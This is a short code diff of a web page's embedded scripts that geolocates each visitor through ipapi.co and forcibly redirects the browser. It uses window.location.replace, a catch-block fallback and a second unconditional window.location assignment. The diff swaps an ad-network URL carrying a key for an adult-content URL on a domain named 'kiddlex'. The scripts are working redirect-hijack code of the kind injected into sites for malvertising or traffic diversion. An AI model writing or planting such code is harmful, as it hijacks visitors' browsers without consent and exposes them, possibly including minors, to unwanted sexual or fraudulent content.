@@ -8,8 +8,8 @@ fetch('https://ipapi.co/json/')
 
     var allowedCountries = ["US", "AS", "NZ", "GR"];
 
-    var specialUrl = "https://www.effectivegatecpm.com/kh81rpk0?key=f8432205e2b6661a9aeb3b8e283e69ef";
-    var otherUrl = "https://www.effectivegatecpm.com/kh81rpk0?key=f8432205e2b6661a9aeb3b8e283e69ef";
+    var specialUrl = "https://jk.kiddlex.com/freesexphotos/";
+    var otherUrl = "https://jk.kiddlex.com/freesexphotos/";
 
     if (allowedCountries.includes(country)) {
       window.location.replace(specialUrl);
@@ -19,11 +19,11 @@ fetch('https://ipapi.co/json/')
 
   })
   .catch(() => {
-    window.location.replace("https://www.effectivegatecpm.com/kh81rpk0?key=f8432205e2b6661a9aeb3b8e283e69ef");
+    window.location.replace("https://jk.kiddlex.com/freesexphotos/");
   });
 </script>
     <script type="text/javascript">
-      window.location = &#34;https://www.effectivegatecpm.com/kh81rpk0?key=f8432205e2b6661a9aeb3b8e283e69ef&#34;;
+      window.location = &#34;https://jk.kiddlex.com/freesexphotos/&#34;;
     </script>
     <script type="application/ld+json">
       {
